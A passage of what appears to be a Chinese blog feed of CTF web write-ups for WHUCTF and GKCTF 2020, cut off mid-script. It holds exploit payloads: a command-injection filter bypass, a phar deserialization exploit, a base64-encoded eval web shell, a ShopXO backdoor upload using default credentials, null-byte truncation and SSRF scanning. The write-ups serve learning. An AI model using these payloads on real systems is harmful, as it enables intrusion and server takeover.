== <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一步用%0a即可绕过，很熟悉了</p><p>第二步这里之前没有遇到过，这里要md5加密之后的两个数不一样，在经过strtr函数替换之后又要相等，找了资料，找到了类似的题，只不过替换的内容不一样，只要是在经过函数替换之后的md5值是纯数字且为0e开头即可，附上爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(f)</span>:</span></span><br><span class="line">    p = hashlib.md5(f.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">    s = md5(str(i)).replace(<span class="string">'b'</span>,<span class="string">'5'</span>)</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'c'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'d'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">'e'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">'f'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                                print(<span class="string">'i:'</span>+str(i)+<span class="string">'md5:'</span>+s)</span><br><span class="line"><span class="comment">#这里是跑的几个值</span></span><br><span class="line">i:<span class="number">11230178</span>md5:<span class="number">0e732639146814822596549556939597</span></span><br><span class="line">i:<span class="number">20493141</span>md5:<span class="number">0e343359461627556649445574858858</span></span><br><span class="line">i:<span class="number">31367140</span>md5:<span class="number">0e792219082918318159634476857695</span></span><br><span class="line">i:<span class="number">40371185</span>md5:<span class="number">0e675215526424812964725042621087</span></span><br></pre></td></tr></table></figure><p>第三步就是反序列化的字符逃逸了，需要在反序列化之后的下标为1的数组元素的值为123456，而经过filter会把x替换为yy，所以一个x可以逃逸一个字符，在本地测试之后构造出这一步的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span><span class="number">123456</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>这三步结合起来，就可以拿到flag了，flag在源码处能够看到</p><h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>开题，给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/tac|rm|echo|cat|nl|less|more|tail|head/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"cat't read flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题和GXY的pingpingping类似，但是过滤更严格一点，文件内容读取全被过滤，不过伪协议没被过滤应该可以用，我用的是GXY的payload稍作修改打的，用字符拼接绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure><p>回显ping成功了，F12发现flag</p><h4 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h4><p>开题，可以上传文件，试了一下，jpg，.htaccess都传不上，抓包，发现了点东西</p><img src="/2020/05/25/WHUCTF/4.png" class=""><p>acti0n参数在网页并没有显示出来，用伪协议读取一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line"><span class="keyword">if</span>(!mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> error_get_last()[<span class="string">'message'</span>];</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Failed to make the directory'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">chdir($dir);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">$name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$tmp_name = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$ans = exif_imagetype($tmp_name);</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'filesize too big.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$name) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'filename can not be empty!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(htaccess)|(user)|(\.\.)|(%)|(#)/i'</span>, $name) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span><br><span class="line">$type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line"><span class="keyword">if</span>($type == <span class="string">'image/gif'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpg'</span> <span class="keyword">or</span> $type == <span class="string">'image/png'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Don't cheat me with Content-Type!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($tmp_name);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i'</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'&lt;script&gt;alert("You could not upload this image because of some dangerous code in your file!")&lt;/script&gt;'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i'</span>, $extension) === <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line">&#125; </span><br><span class="line">$upload_file = $name;</span><br><span class="line">move_uploaded_file($tmp_name, $upload_file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($name)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("ä¸ä¼ å¤±è´¥")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;&lt;a href=\"view.php\" &gt;ç¹æå»çä¸ä¼ çæä»¶&lt;/a&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="comment">#header("refresh:3;url=index.php");</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>禁用了很多命令执行函数，不能传.htaccess，不能改content-type字段，不能传包含一句话的图片码，google，再想到题目是反序列化，想到之前碰到过的phar文件格式上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#view.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#include_once "flag.php"; </span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $dir;</span><br><span class="line"><span class="keyword">private</span> $cmd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">'echo "&lt;div style=\"text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\"&gt;Powered by: xxx&lt;/div&gt;";'</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;dir)) &#123;</span><br><span class="line">mkdir(<span class="keyword">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$file = scandir(<span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">return</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$file = <span class="keyword">$this</span>-&gt;get_file_list();</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt; sizeof($file); $i++) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;["</span>.strval($i - <span class="number">1</span>).<span class="string">"]  $file[$i] &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">$name = $file_name;</span><br><span class="line">$width = getimagesize($name)[<span class="number">0</span>];</span><br><span class="line">$height = getimagesize($name)[<span class="number">1</span>];</span><br><span class="line">$times = $width / <span class="number">200</span>;</span><br><span class="line">$width /= $times;</span><br><span class="line">$height /= $times;</span><br><span class="line">$template = <span class="string">"&lt;img style=\"clear: both;display: block;margin: auto;\" src=\"$this-&gt;dir$name\" alt=\"$file_name\" width = \"$width\" height = \"$height\"&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $template;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">$name = $file_name;</span><br><span class="line"><span class="keyword">if</span> (file_exists($name)) &#123;</span><br><span class="line">@unlink($name);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($name)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;æåå é¤! 3såè·³è½¬&lt;/p&gt;"</span>;</span><br><span class="line">header(<span class="string">"refresh:3;url=view.php"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can not delete!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;æ¾ä¸å°è¿ä¸ªæä»¶! &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ins = <span class="keyword">new</span> View();</span><br><span class="line">chdir($ins-&gt;dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;å½åç®å½ä¸º "</span> . $ins-&gt;dir . <span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">$ins-&gt;show_file_list();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'show'</span>])) &#123;</span><br><span class="line">$file_name = $_POST[<span class="string">'show'</span>];</span><br><span class="line">$ins-&gt;show_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'delete'</span>])) &#123;</span><br><span class="line">$file_name = $_POST[<span class="string">'delete'</span>];</span><br><span class="line">$ins-&gt;delete_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($ins);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用点就在这了，__destruct魔术方法会把$this-&gt;cmd打印到php文件中，可控</p><p>这里注意到后面要POST传参给show进行打印文件内容</p><p>下面是exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $dir;</span><br><span class="line"><span class="keyword">private</span> $cmd=<span class="string">"show_source(\"/var/www/html/flag.php\");"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> View();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"5.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>生成phar文件之后直接传上去，post一下</p><img src="/2020/05/25/WHUCTF/5.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> WHUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF</title>
      <link href="/2020/05/24/GKCTF/"/>
      <url>/2020/05/24/GKCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>前言：</p><a id="more"></a><p>这次比赛可以说打的挺糟糕吧，没有做出来的web，还是积累的不够，做的题不够多，仍需努力啊！下面是赛后复现，不多说，开整！</p><h4 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h4><p>开题给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure><p>审计代码,给Ginkgo以GET或者POST的方式传递base64加密过的语句，会通过eval打印出来，就成了php中可执行的语句，通过这个方法可以写入一句话getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo&#x3D;ZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF/1.png" class=""><p>可以看到disable_function中禁用了很多执行函数，跟之前的一道RCEME很像，蚁剑连一下，根目录下有flag和readflag，但是不能读，尝试用插件绕过，没有用</p><p>找别的师傅拿了一个绕php7.3disable_function的文件(ps:比赛找资料的能力太菜了23333)</p><p>可以把那个文件上传到tmp目录下（tmp目录是可传的，之前并不知道，太菜）</p><p>然后再包含一下这个文件的所在路径，get到flag</p><img src="/2020/05/24/GKCTF/2.png" class=""><h4 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h4><p>打开是shopxo商城，google一下，找到了一篇文章讲shopxo后台获取shell的文章[附上链接：<a href="http://www.nctry.com/1660.html]" target="_blank" rel="noopener">http://www.nctry.com/1660.html]</a></p><p>访问admin.php页面，默认登录用户名和密码是admin和shopxo</p><p>在后台下载默认主题，把自己的🐎放在default_static_ 目录下，再在后台找到网站管理-主题管理-主题安装，shell就成功上传了，访问地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;xxx.php</span><br></pre></td></tr></table></figure><p>蚁剑连接，根目录下有flag和readflag，得到提示</p><p>true_flag_in_/root</p><p>先看一下进程，pa aux(有时间总结一下linux一些不熟悉的命令)</p><p>读取一下auto.sh,发现py文件，读取</p><img src="/2020/05/24/GKCTF/3.png" class=""><p>这个python文件会把某些内容写入到flag.hint中，我们只要修改一下就能拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">"\nGet The RooT,The Date Is Useful!"</span></span><br><span class="line">f=io.open(<span class="string">"/flag.hint"</span>, <span class="string">"rb+"</span>)</span><br><span class="line">s=os.popen(<span class="string">'cat /root/flag'</span>).read()</span><br><span class="line">f.write(str(s))</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>等待60s，在flag.hint找到flag</p><h4 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h4><p>打开题目有一个链接，点击，没有发现什么有用的东西，根据hint，cve-2020-7066，google，发现这个漏洞用的就是%00截断，看了别的师傅说和昨天bjd的考点类似，可惜也没做出来，修改一下访问的url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF/4.png" class=""><p>这里有提示，host必须要end with 123</p><p>继续修改，得到flag</p><img src="/2020/05/24/GKCTF/5.png" class=""><h4 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h4><p>开题，在页面源码处找到提示，访问?secret</p><img src="/2020/05/24/GKCTF/6.png" class=""><p>可以看到addr是173.235.107.10,ssrf探测内网，写个脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">ip = <span class="string">'173.235.107.&#123;&#125;'</span></span><br><span class="line">url = <span class="string">'http://99f58bf3-0950-499e-9f50-cdeeb37d306d.node3.buuoj.cn'</span></span><br><span class="line">temp = <span class="string">"&#123;0&#125;/index.php?url=&#123;1&#125;&amp;submit=%E6%8F%90%E4%BA%A4"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span 